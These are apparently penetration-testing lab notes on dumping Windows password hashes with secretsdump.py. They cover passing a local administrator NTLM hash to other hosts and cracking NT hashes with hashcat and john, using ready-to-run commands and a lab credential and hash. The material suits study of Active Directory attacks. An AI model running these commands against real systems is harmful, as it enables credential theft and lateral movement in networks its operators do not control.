## **Dumping Hashes with Secretsdump.py**

You can dump hashes directly with `secretsdump` rather than using the smbrelay attack, except you need to access shares, you should still try both though
## **Usage**


```powershell
# Dumping SAM hashes
# secretsdump.py domain.tld/user:password@target_IP

$ secretsdump.py MARVEL.local/fcastle:Password1@192.168.0.132
```


**_Dumped Hashes :_**


```shell
--SNIP--

```


**Note :** You should always focus on the hashes of  `administrator` and other users like `frankcastle` in our place, usually Guest, DefaultAccount and WDAGUtilityAccount are more of defaults account so there is no much to worry about.

Also watch out for **Wdigest** password cos' it is an old protocol on Windows 7, Windows 8 , Windows server 2008 R2 and Windows Server 2012.This is used to store passwords in clear text

### **Dumping Individual hashes with local admin hash**

sometimes we might not be able to dump hashes by just specifying the user like we did in the first step, we where able to dump `MARVEL.local/fcastle` hash but we where not able to dump `MARVEL.local/pparkers` hash, If we can dump a user hash, we can copy the local admin hash and try it out with other users to see if they share the same admin hash, then we can get a user hash from there

```powershell
# Dumping frankcastle hash with local admin hash
$ secretsdump.py administrator:@192.168.0.132 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

```powershell
# dumping peterparker hash with the local admin hash we got from fcastle
$ secretsdump.py administrator:@192.168.0.183 -hashes aad3b435b51404eeaad3b435b51404ee:7facdc498ed1680c4fd1448319a8c04f
```

**Note :** The only thing that changes here is the IP address of each user, every command option stays the same




## **Cracking Hashes**


We can take the `NT` potion (second potion) of each user hash we want to crack and then crack it.

```powershell
# paste hash into a txt file
$ echo "7facdc498ed1680c4fd1448319a8c04f" > hash.txt

# cracking hash with hashcat
$ hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt

# cracking hash with john
$ john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --fork=4
```
